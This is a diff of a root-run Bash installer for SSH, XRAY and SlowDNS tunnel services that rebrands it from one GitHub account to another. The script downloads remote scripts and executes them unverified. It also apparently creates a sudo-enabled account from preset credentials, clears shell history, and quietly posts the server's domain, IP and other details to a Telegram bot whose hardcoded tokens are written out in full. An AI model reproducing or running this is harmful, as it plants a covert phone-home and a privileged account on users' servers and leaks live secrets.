@@ -14,7 +14,7 @@ yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 # domain random
-CDN="https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/ssh"
+CDN="https://raw.githubusercontent.com/kizunanet/Bijivps/main/ssh"
 cd /root
 if [ "${EUID}" -ne 0 ]; then
 echo "You need to run this script as root"
@@ -106,13 +106,10 @@ echo -e "[ ${green}INFO${NC} ] Preparing the install file"
 apt install git curl -y >/dev/null 2>&1
 apt install python -y >/dev/null 2>&1
 echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
-echo -e "$green                                                                                         $NC"
-echo -e "$green██████╗░██████╗░██╗███╗░░██╗░██████╗░░█████╗░░██████╗  ░█████╗░██╗░░░██╗████████╗░█████╗░$NC"
-echo -e "$green██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██╔══██╗██╔════╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗$NC"
-echo -e "$green██████╦╝██████╔╝██║██╔██╗██║██║░░██╗░███████║╚█████╗░  ███████║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██╔══██╗██╔══██╗██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗  ██╔══██║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██████╦╝██║░░██║██║██║░╚███║╚██████╔╝██║░░██║██████╔╝  ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝$NC"
-echo -e "$green╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░$NC"
+echo -e "${green}_    _  ____  __     ___  _____  __  __  ____    ____  _____"
+echo -e "${green}( \/\/ )( ___)(  )   / __)(  _  )(  \/  )( ___)  (_  _)(  _  )"
+echo -e "${green})     (  )__)  )(__ ( (__  )(_)(  )    (  )__)     )(   )(_)("
+echo -e "${green}(__/\__)(____)(____) \___)(_____)(_/\/\_)(____)   (__) (_____)"
 echo -e "$green                                                                                         $NC"
 echo -e "$green██╗███╗░░██╗░██████╗████████╗░█████╗░██╗░░░░░██╗░░░░░  ░██████╗░██████╗██╗░░██╗$NC"
 echo -e "$green██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔════╝██║░░██║$NC"
@@ -126,7 +123,7 @@ echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 echo ""
-wget -q https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/tools.sh;chmod +x tools.sh;./tools.sh
+wget -q https://raw.githubusercontent.com/kizunanet/Bijivps/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
 echo " "
@@ -174,11 +171,11 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="1813590936"
-KEY="6061408318:AAF76AEwYsnLrvi9VJY5SjNMgvXNCy-rZV8"
+CHATID="5767231106"
+KEY="6384685365:AAGaoSMvSpaXTWME2PpvrsGihZsp6NnFV90"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script v6 By bringas 
+TEXT="Installasi script v6 By Raden Rizki 
 ============================
 <code>Domain     :</code> <code>$domain</code>
 <code>IP Vps     :</code> <code>$IPVPS</code>
@@ -192,35 +189,47 @@ TEXT="Installasi script v6 By bringas
 "
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[33m===================================\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+echo -e "Loading....."
+sleep 3
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+wget https://raw.githubusercontent.com/kizunanet/Bijivps/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+clear
+echo -e "\e[33m===================================\033[0m"
 echo -e "$green      Install BACKUP               $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
+echo -e "Loading....."
+sleep 3
+clear
+wget https://raw.githubusercontent.com/kizunanet/Bijivps/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[33m===================================\033[0m"
 echo -e "$green          Install XRAY              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-wget https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+echo -e "Loading....."
+sleep 3
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+wget https://raw.githubusercontent.com/kizunanet/Bijivps/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget https://raw.githubusercontent.com/kizunanet/Bijivps/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+clear
+echo -e "\e[33m===================================\033[0m"
 echo -e "$green          Install SLOWDNS              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
-wget -q -O slow.sh https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/slow.sh && chmod +x slow.sh && ./slow.sh
+echo -e "Loading....."
+sleep 3
+clear
+wget -q -O slow.sh https://raw.githubusercontent.com/kizunanet/Bijivps/main/slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 cat> /root/.profile << END
 if [ "$BASH" ]; then
@@ -243,7 +252,7 @@ if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
 history -c
-serverV=$( curl -sS https://raw.githubusercontent.com/R2GANTENG/Bijivps/main/version  )
+serverV=$( curl -sS https://raw.githubusercontent.com/kizunanet/Bijivps/main/version  )
 echo $serverV > /opt/.ver
 aureb=$(cat /home/re_otm)
 b=11
@@ -256,8 +265,8 @@ fi
 curl -sS ifconfig.me > /etc/myipvps
 echo " "
 echo "=====================-[ RadenRizki ]-===================="
-echo ""
-echo "------------------------------------------------------------"
+echo "=====================-[ KIZUNA NET ]-===================="
+echo "---------------------------------------------------------"
 echo ""
 echo ""
 echo "   >>> Service & Port"  | tee -a log-install.txt
@@ -296,7 +305,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "===============-[ Script by Raden Rizki]-==============="
+echo "===============-[ FREE ALL VPN NUSA ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
